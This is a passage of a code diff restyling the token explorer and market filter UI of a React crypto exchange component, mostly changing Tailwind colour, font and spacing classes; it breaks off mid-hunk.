+                                                        <span className="text-emerald-600 font-mono tracking-tighter relative z-10">${b.price.toFixed(toToken?.current_price < 1 ? 6 : 2)}</span>
+                                                        <span className="text-slate-400 font-mono italic relative z-10">{b.amount.toFixed(2)}</span>
+                                                        <div className="absolute inset-y-0 right-0 bg-emerald-500/5 rounded-sm transition-all duration-700" style={{ width: `${(b.cumulative / orderBookData.maxVolume) * 100}%` }} />
                                                     </div>
                                                 ))}
                                             </div>
@@ -1760,10 +1953,10 @@ export default function B20Exchange() {
                                 <div>
                                     <div className="flex items-center gap-3 mb-4">
                                         <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                        <span className="text-[10px] font-black text-emerald-500 uppercase tracking-[0.4em]">WEB3 CROSS-CHAIN EXPLORER // MULTI-NETWORK ACTIVE</span>
+                                        <span className="text-[10px] font-black text-emerald-500 uppercase tracking-widest">WEB3 CROSS-CHAIN EXPLORER // MULTI-NETWORK ACTIVE</span>
                                     </div>
-                                    <h1 className="text-5xl md:text-7xl font-black text-gray-900 uppercase tracking-tighter leading-none mb-4">WEB3 <span className="text-amber-500">PORTAL</span></h1>
-                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">5000+ Cross-Chain Assets · DexScreener Indexed · Institutional Routing</p>
+                                    <h1 className="text-5xl md:text-7xl font-black text-slate-900 uppercase tracking-tighter leading-none mb-4">WEB3 <span className="text-indigo-600">PORTAL</span></h1>
+                                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest">5000+ Cross-Chain Assets · DexScreener Indexed · Institutional Routing</p>
                                 </div>
                                 <div className="flex items-center gap-3 px-6 py-4 bg-emerald-50 border border-emerald-100 rounded-2xl">
                                     <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
@@ -1772,23 +1965,23 @@ export default function B20Exchange() {
                             </div>
 
                             {/* Filters, Search & View Toggle Row */}
-                            <div className="flex flex-col gap-6 bg-white shadow-2xl shadow-gray-100/80 border border-gray-100 rounded-[2.5rem] p-6">
+                            <div className="flex flex-col gap-6 bg-white shadow-2xl shadow-gray-100/80 border border-slate-200/60 rounded-2xl p-6">
                                 {/* Row 1: Category Filters */}
                                 <div className="flex flex-wrap items-center justify-between gap-4">
                                 <div className="flex flex-col gap-6 w-full">
 
                                     {/* Network Filter */}
                                     <div className="flex flex-col gap-2 max-w-full">
-                                        <span className="text-[9px] font-black uppercase tracking-[0.25em] text-gray-400 pl-2 flex items-center gap-1.5">
-                                            <Layers className="w-3 h-3 text-amber-500" /> Network
+                                        <span className="text-[9px] font-bold uppercase tracking-[0.25em] text-slate-400 pl-2 flex items-center gap-1.5">
+                                            <Layers className="w-3 h-3 text-indigo-600" /> Network
                                         </span>
                                         <div className="max-w-full overflow-x-auto scrollbar-hide">
-                                            <div className="flex bg-gray-50 shadow-inner p-1.5 rounded-[1.5rem] border border-gray-100 font-black uppercase tracking-widest text-[9px] gap-1 min-w-max">
+                                            <div className="flex bg-slate-50 shadow-inner p-1.5 rounded-[1.5rem] border border-slate-200/60 font-bold uppercase tracking-widest text-[9px] gap-1 min-w-max">
                                                 {['ALL', ...NETWORKS_LIST].map(net => (
                                                     <button 
                                                         key={net}
                                                         onClick={() => setNetworkFilter(net)}
-                                                        className={`px-4 py-3 rounded-[1.2rem] flex items-center gap-2 transition-all whitespace-nowrap ${networkFilter === net ? 'bg-amber-500 text-white shadow-lg scale-105' : 'text-gray-400 hover:text-gray-900'}`}
+                                                        className={`px-4 py-3 rounded-[1.2rem] flex items-center gap-2 transition-all whitespace-nowrap ${networkFilter === net ? 'bg-indigo-600 text-white shadow-lg scale-105' : 'text-slate-400 hover:text-slate-900'}`}
                                                     >
                                                         {net === 'ALL' ? <Globe className="w-4 h-4 flex-shrink-0" /> : <NetPill net={net} />}
                                                     </button>
@@ -1799,22 +1992,22 @@ export default function B20Exchange() {
 
                                     {/* Category Filter */}
                                     <div className="flex flex-col gap-2">
-                                        <span className="text-[9px] font-black uppercase tracking-[0.25em] text-gray-400 pl-2 flex items-center gap-1.5">
+                                        <span className="text-[9px] font-bold uppercase tracking-[0.25em] text-slate-400 pl-2 flex items-center gap-1.5">
                                             <LayoutGrid className="w-3 h-3 text-gray-500" /> Category
                                         </span>
-                                        <div className="flex bg-gray-50 p-1.5 rounded-[1.5rem] border border-gray-100 font-black uppercase tracking-widest text-[10px] gap-1 flex-wrap">
+                                        <div className="flex bg-slate-50 p-1.5 rounded-[1.5rem] border border-slate-200/60 font-bold uppercase tracking-widest text-[10px] gap-1 flex-wrap">
                                             {[
                                                 { id: 'all', label: 'All Tokens', icon: <Globe className="w-3.5 h-3.5" /> },
                                                 { id: 'new', label: 'Newly Launched', icon: <Sparkles className="w-3.5 h-3.5 text-cyan-500" /> },
                                                 { id: 'gainers', label: 'Gainers', icon: <TrendingUp className="w-3.5 h-3.5 text-emerald-500" /> },
                                                 { id: 'losers', label: 'Losers', icon: <TrendingDown className="w-3.5 h-3.5 text-rose-500" /> },
-                                                { id: 'trending', label: 'Trending', icon: <TrendingUp className="w-3.5 h-3.5 text-amber-500" /> },
+                                                { id: 'trending', label: 'Trending', icon: <TrendingUp className="w-3.5 h-3.5 text-indigo-600" /> },
                                                 { id: 'volume', label: 'High Volume', icon: <Activity className="w-3.5 h-3.5 text-blue-500" /> },
                                             ].map(cat => (
                                                 <button
                                                     key={cat.id}
                                                     onClick={() => setMarketCategory(cat.id)}
-                                                    className={`px-6 py-3 rounded-[1.2rem] flex items-center gap-2.5 transition-all ${marketCategory === cat.id ? 'bg-gray-900 text-white shadow-lg scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-white'}`}
+                                                    className={`px-6 py-3 rounded-[1.2rem] flex items-center gap-2.5 transition-all ${marketCategory === cat.id ? 'bg-gray-900 text-white shadow-lg scale-105' : 'text-slate-400 hover:text-slate-900 hover:bg-white'}`}
                                                 >
                                                     {cat.icon} {cat.label}
                                                 </button>
@@ -1825,12 +2018,12 @@ export default function B20Exchange() {
 
                                     {/* Sort & View Toggle */}
                                     <div className="flex items-center gap-3">
-                                        <div className="flex items-center gap-3 bg-gray-50 border border-gray-100 rounded-2xl px-5 py-3">
-                                            <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest whitespace-nowrap">Sort:</span>
+                                        <div className="flex items-center gap-3 bg-slate-50 border border-slate-200/60 rounded-2xl px-5 py-3">
+                                            <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest whitespace-nowrap">Sort:</span>
                                             <select
                                                 value={marketSort}
                                                 onChange={(e) => setMarketSort(e.target.value)}
-                                                className="bg-transparent text-[10px] font-black uppercase tracking-widest text-gray-900 outline-none cursor-pointer"
+                                                className="bg-transparent text-[10px] font-bold uppercase tracking-widest text-slate-900 outline-none cursor-pointer"
                                             >
                                                 <option value="rank">Crypto Rank</option>
                                                 <option value="mcap">Market Cap</option>
@@ -1839,16 +2032,16 @@ export default function B20Exchange() {
                                                 <option value="change">Highest Volatility</option>
                                             </select>
                                         </div>
-                                        <div className="flex bg-gray-50 border border-gray-100 p-1.5 rounded-2xl gap-1">
+                                        <div className="flex bg-slate-50 border border-slate-200/60 p-1.5 rounded-2xl gap-1">
                                             <button
                                                 onClick={() => setViewType('card')}
-                                                className={`p-3 rounded-xl transition-all ${viewType === 'card' ? 'bg-gray-900 text-white shadow-lg' : 'text-gray-400 hover:text-gray-900'}`}
+                                                className={`p-3 rounded-xl transition-all ${viewType === 'card' ? 'bg-gray-900 text-white shadow-lg' : 'text-slate-400 hover:text-slate-900'}`}
                                             >
                                                 <LayoutGrid className="w-4 h-4" />
                                             </button>
                                             <button
                                                 onClick={() => setViewType('list')}
-                                                className={`p-3 rounded-xl transition-all ${viewType === 'list' ? 'bg-gray-900 text-white shadow-lg' : 'text-gray-400 hover:text-gray-900'}`}
+                                                className={`p-3 rounded-xl transition-all ${viewType === 'list' ? 'bg-gray-900 text-white shadow-lg' : 'text-slate-400 hover:text-slate-900'}`}
                                             >
                                                 <List className="w-4 h-4" />
                                             </button>
@@ -1858,13 +2051,13 @@ export default function B20Exchange() {
 
                                 {/* Row 2: Search Bar */}
                                 <div className="relative group/search">
-                                    <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within/search:text-amber-500 transition-colors" />
+                                    <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within/search:text-indigo-600 transition-colors" />
                                     <input
                                         type="text"
                                         placeholder="SEARCH BY NAME, SYMBOL OR PASTE CONTRACT ADDRESS (0x...)..."
                                         value={marketSearch}
                                         onChange={(e) => setMarketSearch(e.target.value)}
-                                        className="w-full bg-gray-50 border border-gray-100 rounded-[1.5rem] py-5 pl-16 pr-6 text-[10px] font-black uppercase tracking-widest outline-none focus:bg-white focus:border-amber-500/50 focus:shadow-xl focus:shadow-amber-500/5 transition-all placeholder:text-gray-200"
+                                        className="w-full bg-slate-50 border border-slate-200/60 rounded-[1.5rem] py-5 pl-16 pr-6 text-[10px] font-bold uppercase tracking-widest outline-none focus:bg-white focus:border-indigo-500/50 focus:shadow-xl focus:shadow-indigo-500/5 transition-all placeholder:text-gray-200"
                                     />
                                     {marketSearch && (
                                         <button
@@ -1877,13 +2070,13 @@ export default function B20Exchange() {
                                 </div>
 
                                 <div className="flex items-center justify-between px-2">
-                                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">
-                                        Showing <span className="text-gray-900">{displayTokens.length}</span> assets
+                                    <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">
+                                        Showing <span className="text-slate-900">{displayTokens.length}</span> assets
                                     </p>
                                     {marketSearch.length > 30 && (
                                         <button
                                             onClick={() => handleSelectToken({ address: marketSearch, symbol: 'CUSTOM', name: 'Contract Import', image: 'https://cdn-icons-png.flaticon.com/512/2584/2584687.png', current_price: 0, price_change_percentage_24h: 0 })}
-                                            className="flex items-center gap-2 px-6 py-3 bg-amber-500 text-white rounded-xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-amber-500/20 hover:bg-amber-600 transition-all"
+                                            className="flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white rounded-xl text-[10px] font-bold uppercase tracking-widest shadow-lg shadow-indigo-500/20 hover:bg-indigo-600 transition-all"
                                         >
                                             <Rocket className="w-3.5 h-3.5" /> Import Contract
                                         </button>
@@ -1900,7 +2093,7 @@ export default function B20Exchange() {
                                             initial={{ opacity: 0, y: 10 }}
                                             animate={{ opacity: 1, y: 0 }}
                                             transition={{ delay: Math.min(i * 0.015, 0.3) }}
-                                            className="bg-white border border-gray-100 rounded-[2.5rem] p-6 hover:shadow-2xl hover:shadow-gray-200/50 hover:-translate-y-1 transition-all group relative overflow-hidden"
+                                            className="bg-white border border-slate-200/60 rounded-2xl p-6 hover:shadow-2xl hover:shadow-gray-200/50 hover:-translate-y-1 transition-all group relative overflow-hidden"
                                         >
                                             <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-bl from-gray-50 to-transparent rounded-bl-[3rem] opacity-0 group-hover:opacity-100 transition-opacity" />
                                             <div className="flex items-center justify-between mb-6">
@@ -1909,8 +2102,8 @@ export default function B20Exchange() {
                                                     {t.image ? <img src={t.image} className="w-full h-full object-contain rounded-lg" alt="" /> : null}
                                                 </div>
                                                     <div>
-                                                        <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest">{t.symbol}</p>
-                                                        <p className="text-xs font-black text-gray-900 capitalize truncate max-w-[80px]">{t.name}</p>
+                                                        <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">{t.symbol}</p>
+                                                        <p className="text-xs font-black text-slate-900 capitalize truncate max-w-[80px]">{t.name}</p>
                                                     </div>
                                                 </div>
                                                 <span className={`text-[9px] font-black px-2.5 py-1.5 rounded-xl ${t.price_change_percentage_24h >= 0 ? 'bg-emerald-50 text-emerald-600' : 'bg-rose-50 text-rose-600'}`}>
@@ -1919,17 +2112,17 @@ export default function B20Exchange() {
                                             </div>
                                             <div className="mb-6">
                                                 <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1">Price</p>
-                                                <p className="text-xl font-black text-gray-900 group-hover:text-amber-500 transition-colors font-mono">
+                                                <p className="text-xl font-black text-slate-900 group-hover:text-indigo-600 transition-colors font-mono">
                                                     ${t.current_price < 0.01 ? t.current_price?.toFixed(6) : t.current_price?.toLocaleString()}
                                                 </p>
                                             </div>
-                                            <div className="flex justify-between items-center text-[9px] font-bold text-gray-400 uppercase tracking-widest mb-6 border-t border-gray-50 pt-4">
+                                            <div className="flex justify-between items-center text-[9px] font-bold text-slate-400 uppercase tracking-widest mb-6 border-t border-gray-50 pt-4">
                                                 <span>MCap: {formatB20Number(t.market_cap, "$")}</span>
                                                 <span>Supply: {formatB20Number(t.total_supply)}</span>
                                             </div>
                                             <div className="flex gap-2">
-                                                <button onClick={() => { setMode('spot'); setToToken(t); }} className="flex-1 py-3.5 bg-emerald-500 text-white rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-lg shadow-emerald-500/20 active:scale-95 transition-all hover:bg-emerald-600">Buy</button>
-                                                <button onClick={() => { setMode('spot'); setFromToken(t); }} className="flex-1 py-3.5 bg-rose-500 text-white rounded-2xl text-[9px] font-black uppercase tracking-widest shadow-lg shadow-rose-500/20 active:scale-95 transition-all hover:bg-rose-600">Sell</button>
+                                                <button onClick={() => { setMode('spot'); setToToken(t); }} className="flex-1 py-3.5 bg-emerald-500 text-white rounded-2xl text-[9px] font-bold uppercase tracking-widest shadow-lg shadow-emerald-500/20 active:scale-95 transition-all hover:bg-emerald-600">Buy</button>
+                                                <button onClick={() => { setMode('spot'); setFromToken(t); }} className="flex-1 py-3.5 bg-rose-500 text-white rounded-2xl text-[9px] font-bold uppercase tracking-widest shadow-lg shadow-rose-500/20 active:scale-95 transition-all hover:bg-rose-600">Sell</button>
                                             </div>
                                         </motion.div>
                                     ))}
@@ -1938,9 +2131,9 @@ export default function B20Exchange() {
 
                             {/* Asset List View */}
                             {viewType === 'list' && (
-                                <div className="bg-white border border-gray-100 rounded-[2.5rem] overflow-hidden shadow-xl shadow-gray-100/50">
+                                <div className="bg-white border border-slate-200/60 rounded-2xl overflow-hidden shadow-xl shadow-gray-100/50">
                                     {/* List Header */}
-                                    <div className="grid grid-cols-12 text-[9px] font-black text-gray-400 uppercase tracking-widest p-5 border-b border-gray-50 bg-gray-50/80 items-center">
+                                    <div className="grid grid-cols-12 text-[9px] font-black text-slate-400 uppercase tracking-widest p-5 border-b border-gray-50 bg-slate-50/80 items-center">
                                         <div className="col-span-1">#</div>
                                         <div className="col-span-3">Asset</div>
                                         <div className="col-span-2 text-right">Price</div>
@@ -1955,7 +2148,7 @@ export default function B20Exchange() {
                                                 initial={{ opacity: 0 }}
                                                 animate={{ opacity: 1 }}
                                                 transition={{ delay: Math.min(i * 0.005, 0.1) }}
-                                                className="grid grid-cols-12 items-center px-5 py-4 hover:bg-gray-50/80 transition-colors group"
+                                                className="grid grid-cols-12 items-center px-5 py-4 hover:bg-slate-50/80 transition-colors group"
                                             >
                                                 <div className="col-span-1 text-[10px] font-black text-gray-300">
                                                     {t.market_cap_rank || i + 1}
@@ -1963,11 +2156,11 @@ export default function B20Exchange() {
                                                 <div className="col-span-3 flex items-center gap-3">
                                                     {t.image ? <img src={t.image} className="w-9 h-9 rounded-xl group-hover:scale-110 transition-transform" /> : null}
                                                     <div>
-                                                        <p className="text-xs font-black text-gray-900 uppercase">{t.symbol}</p>
-                                                        <p className="text-[9px] font-bold text-gray-400 capitalize truncate max-w-[80px]">{t.name}</p>
+                                                        <p className="text-xs font-black text-slate-900 uppercase">{t.symbol}</p>
+                                                        <p className="text-[9px] font-bold text-slate-400 capitalize truncate max-w-[80px]">{t.name}</p>
                                                     </div>
                                                 </div>
-                                                <div className="col-span-2 text-right font-mono text-[11px] font-black text-gray-900">
+                                                <div className="col-span-2 text-right font-mono text-[11px] font-black text-slate-900">
                                                     ${t.current_price < 0.01 ? t.current_price?.toFixed(6) : t.current_price?.toLocaleString()}
                                                 </div>
                                                 <div className={`col-span-2 text-right text-[11px] font-black ${t.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
@@ -1977,8 +2170,8 @@ export default function B20Exchange() {
                                                     {formatB20Number(t.market_cap, "$")}
                                                 </div>
                                                 <div className="col-span-2 flex justify-end gap-2">
-                                                    <button onClick={() => { setMode('spot'); setToToken(t); }} className="px-4 py-2 bg-emerald-500 text-white rounded-xl text-[9px] font-black uppercase tracking-widest shadow-md shadow-emerald-500/20 active:scale-95 transition-all hover:bg-emerald-600">Buy</button>
-                                                    <button onClick={() => { setMode('spot'); setFromToken(t); }} className="px-4 py-2 bg-rose-500 text-white rounded-xl text-[9px] font-black uppercase tracking-widest shadow-md shadow-rose-500/20 active:scale-95 transition-all hover:bg-rose-600">Sell</button>
+                                                    <button onClick={() => { setMode('spot'); setToToken(t); }} className="px-4 py-2 bg-emerald-500 text-white rounded-xl text-[9px] font-bold uppercase tracking-widest shadow-md shadow-emerald-500/20 active:scale-95 transition-all hover:bg-emerald-600">Buy</button>
+                                                    <button onClick={() => { setMode('spot'); setFromToken(t); }} className="px-4 py-2 bg-rose-500 text-white rounded-xl text-[9px] font-bold uppercase tracking-widest shadow-md shadow-rose-500/20 active:scale-95 transition-all hover:bg-rose-600">Sell</button>
                                                 </div>
                                             </motion.div>
                                         ))}
@@ -1990,8 +2183,8 @@ export default function B20Exchange() {
                             <div ref={scrollSentinelRef} className="h-40 w-full flex items-center justify-center pb-20">
                                 {displayTokens.length > visibleItems && (
                                     <div className="flex flex-col items-center gap-4">
-                                        <div className="w-8 h-8 border-4 border-amber-500 border-t-transparent rounded-full animate-spin" />
-                                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest animate-pulse">
+                                        <div className="w-8 h-8 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin" />
+                                        <span className="text-[10px] font-black text-slate-400 uppercase tracking-widest animate-pulse">
                                             Synchronizing Institutional Liquidity... ({displayTokens.length - visibleItems} Assets Remaining)
                                         </span>
                                     </div>
@@ -1999,9 +2192,9 @@ export default function B20Exchange() {
                             </div>
 
                             {displayTokens.length === 0 && (
-                                <div className="py-24 flex flex-col items-center justify-center text-center bg-white border border-gray-100 rounded-[3rem]">
+                                <div className="py-24 flex flex-col items-center justify-center text-center bg-white border border-slate-200/60 rounded-2xl">
                                     <Search className="w-12 h-12 text-gray-200 mb-6" />
-                                    <p className="text-sm font-black text-gray-400 uppercase tracking-widest mb-2">No Assets Found</p>
+                                    <p className="text-sm font-black text-slate-400 uppercase tracking-widest mb-2">No Assets Found</p>
                                     <p className="text-[10px] font-bold text-gray-300 uppercase tracking-widest">Try searching by name, symbol or paste a contract address</p>
                                 </div>
                             )}
@@ -2013,16 +2206,16 @@ export default function B20Exchange() {
                             initial={{ opacity: 0, y: 20 }}
                             animate={{ opacity: 1, y: 0 }}
                             exit={{ opacity: 0, y: -20 }}
-                            className="max-w-[1600px] mx-auto space-y-12"
+                            className="max-w-[1600px] mx-auto space-y-2"
                         >
                             {/* Floating Institutional Alpha HUD - Global Trending */}
-                            <div className="relative overflow-hidden py-10 group -mx-8 min-h-[120px]">
+                            <div className="relative overflow-hidden py-1 group -mx-8 min-h-[60px]">
                                 <div className="absolute left-0 top-0 bottom-0 w-64 bg-gradient-to-r from-transparent via-[#FDFDFD]/80 to-transparent z-10 pointer-events-none" />
                                 <div className="absolute right-0 top-0 bottom-0 w-64 bg-gradient-to-l from-transparent via-[#FDFDFD]/80 to-transparent z-10 pointer-events-none" />
                                 
                                 <div className="absolute left-10 top-1/2 -translate-y-1/2 z-20 flex items-center gap-3">
-                                    <div className="w-2.5 h-2.5 bg-amber-500 rounded-full animate-ping" />
-                                    <span className="text-[10px] font-black text-gray-900 uppercase tracking-[0.4em] whitespace-nowrap bg-white/40 px-5 py-2 rounded-full border border-gray-100 backdrop-blur-md shadow-sm">Trending Alpha</span>
+                                    <div className="w-2.5 h-2.5 bg-indigo-600 rounded-full animate-ping" />
+                                    <span className="text-[10px] font-black text-slate-900 uppercase tracking-widest whitespace-nowrap bg-white/40 px-5 py-2 rounded-full border border-slate-200/60 backdrop-blur-md shadow-sm">Trending Alpha</span>
                                 </div>
 
                                 <motion.div 
@@ -2037,7 +2230,7 @@ export default function B20Exchange() {
                                             className="flex items-center gap-6 cursor-pointer group/float py-2 hover:scale-105 transition-transform"
                                         >
                                             <div className="relative group">
-                                                <div className="absolute inset-0 bg-amber-500/10 blur-xl rounded-full opacity-0 group-hover/float:opacity-100 transition-opacity" />
+                                                <div className="absolute inset-0 bg-indigo-600/10 blur-xl rounded-full opacity-0 group-hover/float:opacity-100 transition-opacity" />
                                                 {t.image ? (
                                                     <img
                                                         src={t.image}
@@ -2047,7 +2240,7 @@ export default function B20Exchange() {
                                                     />
                                                 ) : null}
                                                 <div
-                                                    className="w-10 h-10 relative z-10 rounded-xl bg-gradient-to-br from-amber-400 to-rose-500 flex items-center justify-center text-white font-black text-sm"
+                                                    className="w-10 h-10 relative z-10 rounded-xl bg-gradient-to-br from-indigo-400 to-rose-500 flex items-center justify-center text-white font-black text-sm"
                                                     style={{ display: t.image ? 'none' : 'flex' }}
                                                 >
                                                     {(t.symbol || '?').charAt(0)}
@@ -2055,12 +2248,12 @@ export default function B20Exchange() {
                                             </div>
                                             <div className="space-y-1">
                                                 <div className="flex items-center gap-3">
-                                                    <span className="text-sm font-black text-gray-900 uppercase tracking-tight italic">{t.symbol}</span>
+                                                    <span className="text-sm font-black text-slate-900 uppercase tracking-tight italic">{t.symbol}</span>
                                                     <span className={`text-[11px] font-black ${t.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
                                                         {t.price_change_percentage_24h >= 0 ? '+' : ''}{t.price_change_percentage_24h?.toFixed(2)}%
                                                     </span>
                                                 </div>
-                                                <div className="text-[10px] font-bold text-gray-400 font-mono tracking-tighter">
+                                                <div className="text-[10px] font-bold text-slate-400 font-mono tracking-tighter">
                                                     ${t.current_price < 0.01 ? t.current_price.toFixed(7) : t.current_price?.toLocaleString()}
                                                 </div>
                                             </div>
@@ -2070,48 +2263,75 @@ export default function B20Exchange() {
                                 </motion.div>
                             </div>
 
-                            {/* Unified Market Intelligence Filter Card */}
-                            <div className="mx-4 flex flex-col gap-6 bg-white shadow-2xl shadow-gray-100/80 border border-gray-100 rounded-[2.5rem] p-8">
-                                <div className="flex flex-col gap-6">
-                                    {/* Row 1: Network Filter */}
-                                    <div className="flex flex-col gap-2">
-                                        <span className="text-[9px] font-black uppercase tracking-[0.25em] text-gray-400 pl-2 flex items-center gap-1.5">
-                                            <Layers className="w-3 h-3 text-amber-500" /> Network / Ecosystem
-                                        </span>
+                            {/* Premium Market Intelligence Filter Card */}
+                            <div className="mx-4 flex flex-col gap-4 bg-white/80 backdrop-blur-xl shadow-xl shadow-slate-200/40 border border-slate-100 rounded-3xl px-5 py-3 transition-all duration-500">
+                                <div className="flex flex-col gap-4">
+                                    
+                                    {/* Section 1: Ecosystem Hub */}
+                                    <div className="flex flex-col gap-3">
+                                        <div className="flex items-center justify-between px-2">
+                                            <div className="flex items-center gap-2">
+                                                <div className="p-1.5 bg-indigo-50 rounded-lg">
+                                                    <Layers className="w-3.5 h-3.5 text-indigo-600" />
+                                                </div>
+                                                <div className="flex flex-col">
+                                                    <span className="text-[10px] font-bold uppercase tracking-widest text-slate-900">Ecosystem Hub</span>
+                                                    <span className="text-[8px] font-semibold text-slate-400 uppercase tracking-tighter">Filter by native blockchain network</span>
+                                                </div>
+                                            </div>
+                                            <div className="flex items-center gap-1.5 px-2.5 py-0.5 bg-slate-50 border border-slate-200/50 rounded-full">
+                                                <div className="w-1 h-1 bg-indigo-500 rounded-full animate-pulse" />
+                                                <span className="text-[8px] font-bold text-slate-500 uppercase tracking-widest">Cross-Chain Sync Active</span>
+                                            </div>
+                                        </div>
+
                                         <div className="max-w-full overflow-x-auto scrollbar-hide">
-                                            <div className="flex bg-gray-50 shadow-inner p-1.5 rounded-[1.5rem] border border-gray-100 font-black uppercase tracking-widest text-[9px] gap-1 min-w-max">
-                                                {['ALL', ...NETWORKS_LIST].map(net => (
+                                            <div className="flex items-center gap-1.5 pb-1">
+                                                <button 
+                                                    onClick={() => setNetworkFilter('ALL')}
+                                                    className={`px-5 py-2.5 rounded-xl flex items-center gap-2.5 transition-all whitespace-nowrap border ${networkFilter === 'ALL' ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20 border-indigo-700' : 'bg-slate-50 text-slate-500 hover:text-slate-900 hover:bg-white hover:border-slate-300 border-transparent'}`}
+                                                >
+                                                    <Globe className="w-3.5 h-3.5 shrink-0" />
+                                                    <span className="text-[10px] font-bold uppercase tracking-widest">All Assets</span>
+                                                </button>
+                                                
+                                                <div className="w-px h-6 bg-slate-200 mx-1.5" />
+
+                                                {NETWORKS_LIST.map(net => (
                                                     <button 
                                                         key={net}
                                                         onClick={() => setNetworkFilter(net)}
-                                                        className={`px-4 py-3 rounded-[1.2rem] flex items-center gap-2 transition-all whitespace-nowrap ${networkFilter === net ? 'bg-amber-500 text-white shadow-lg scale-105' : 'text-gray-400 hover:text-gray-900'}`}
+                                                        className={`px-4 py-2.5 rounded-xl flex items-center gap-2.5 transition-all whitespace-nowrap border ${networkFilter === net ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20 border-indigo-700' : 'bg-slate-50 text-slate-500 hover:text-slate-900 hover:bg-white hover:border-slate-300 border-transparent'}`}
                                                     >
-                                                        {net === 'ALL' ? <Globe className="w-4 h-4 flex-shrink-0" /> : <NetPill net={net} />}
+                                                        <img src={NETWORK_LOGOS[net] || getNetworkLogo(net)} alt="" className="w-4 h-4 rounded-full object-contain bg-white p-0.5" />
+                                                        <span className="text-[10px] font-bold uppercase tracking-widest">{net}</span>
                                                     </button>
                                                 ))}
                                             </div>
                                         </div>
                                     </div>
 
-                                    {/* Row 2: Category Filter & Sort Toggle */}
-                                    <div className="flex flex-wrap items-center justify-between gap-6">
-                                        <div className="flex flex-col gap-2">
-                                            <span className="text-[9px] font-black uppercase tracking-[0.25em] text-gray-400 pl-2 flex items-center gap-1.5">
-                                                <LayoutGrid className="w-3 h-3 text-gray-400" /> Market Category
-                                            </span>
-                                            <div className="flex bg-gray-50 p-1.5 rounded-[1.5rem] border border-gray-100 font-black uppercase tracking-widest text-[10px] gap-1 flex-wrap">
+                                    {/* Section 2: Market Category & Intelligence Sort */}
+                                    <div className="grid grid-cols-1 xl:grid-cols-12 gap-5 items-end">
+                                        
+                                        <div className="xl:col-span-8 flex flex-col gap-2">
+                                            <div className="flex items-center gap-2 px-2">
+                                                <LayoutGrid className="w-3.5 h-3.5 text-slate-400" />
+                                                <span className="text-[9px] font-bold uppercase tracking-widest text-slate-500">Market Intelligence Channels</span>
+                                            </div>
+                                            <div className="flex bg-slate-50 p-1.5 rounded-2xl border border-slate-200/50 gap-1.5 flex-wrap">
                                                 {[
-                                                    { id: 'all', label: 'All Tokens', icon: <Globe className="w-3.5 h-3.5" /> },
-                                                    { id: 'new', label: 'Newly Launched', icon: <Sparkles className="w-3.5 h-3.5 text-cyan-500" /> },
-                                                    { id: 'gainers', label: 'Top Gainers', icon: <TrendingUp className="w-3.5 h-3.5 text-emerald-500" /> },
-                                                    { id: 'losers', label: 'Top Losers', icon: <TrendingDown className="w-3.5 h-3.5 text-rose-500" /> },
-                                                    { id: 'trending', label: 'Trending', icon: <TrendingUp className="w-3.5 h-3.5 text-amber-500" /> },
-                                                    { id: 'volume', label: 'High Volume', icon: <Activity className="w-3.5 h-3.5 text-blue-500" /> },
+                                                    { id: 'all', label: 'All Tokens', icon: <Globe className="w-4 h-4" /> },
+                                                    { id: 'new', label: 'Newly Launched', icon: <Sparkles className="w-4 h-4 text-cyan-500" /> },
+                                                    { id: 'gainers', label: 'Top Gainers', icon: <TrendingUp className="w-4 h-4 text-emerald-500" /> },
+                                                    { id: 'losers', label: 'Top Losers', icon: <TrendingDown className="w-4 h-4 text-rose-500" /> },
+                                                    { id: 'trending', label: 'Trending Alpha', icon: <Activity className="w-4 h-4 text-indigo-600" /> },
+                                                    { id: 'volume', label: 'High Volume', icon: <BarChart3 className="w-4 h-4 text-blue-500" /> },
                                                 ].map(cat => (
                                                     <button
                                                         key={cat.id}
                                                         onClick={() => setMarketCategory(cat.id)}
-                                                        className={`px-6 py-3 rounded-[1.2rem] flex items-center gap-2.5 transition-all ${marketCategory === cat.id ? 'bg-gray-900 text-white shadow-lg scale-105' : 'text-gray-400 hover:text-gray-900 hover:bg-white'}`}
+                                                        className={`px-5 py-2.5 rounded-xl flex items-center gap-2.5 transition-all text-[11px] font-bold uppercase tracking-wide ${marketCategory === cat.id ? 'bg-indigo-600 text-white shadow-md shadow-indigo-600/20' : 'text-slate-500 hover:text-slate-900 hover:bg-white hover:shadow-sm'}`}
                                                     >
                                                         {cat.icon} {cat.label}
                                                     </button>
@@ -2119,168 +2339,256 @@ export default function B20Exchange() {
                                             </div>
                                         </div>
 
-                                        <div className="flex items-center gap-3 self-end">
-                                            <div className="flex items-center gap-3 bg-gray-50 border border-gray-100 rounded-2xl px-5 py-3">
-                                                <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest whitespace-nowrap">Sort:</span>
-                                                <select
-                                                    value={marketSort}
-                                                    onChange={(e) => setMarketSort(e.target.value)}
-                                                    className="bg-transparent text-[10px] font-black uppercase tracking-widest text-gray-900 outline-none cursor-pointer"
-                                                >
-                                                    <option value="rank">Crypto Rank</option>
-                                                    <option value="mcap">Market Cap</option>
-                                                    <option value="p_high">Price: High → Low</option>
-                                                    <option value="p_low">Price: Low → High</option>
